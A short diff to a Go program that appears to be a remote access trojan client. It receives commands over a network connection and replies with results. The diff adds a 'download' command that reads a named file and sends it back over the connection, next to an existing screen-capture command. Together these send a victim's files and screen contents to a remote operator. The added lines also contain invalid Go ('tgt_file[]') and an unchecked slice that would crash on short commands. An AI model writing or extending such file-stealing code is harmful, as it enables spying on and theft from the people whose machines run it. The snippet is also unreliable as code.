@@ -48,6 +48,13 @@ func main() {
 					send_msg(conn, fmt.Sprintf("Dir changed successfully to %s", cur_wd))
 				}
 			}
+		} else if cmd[0:8] == "download" { 
+			if cmd == "download" {
+				send_msg(conn, "Supply a file to download :|")
+			} else {
+				tgt_file := strings.Split(cmd, " ")
+				send_msg(conn, read_file(tgt_file[]))
+			}
 		} else if cmd == "capturescr" {
 			result := capture_scr()
 			send_msg(conn, result)
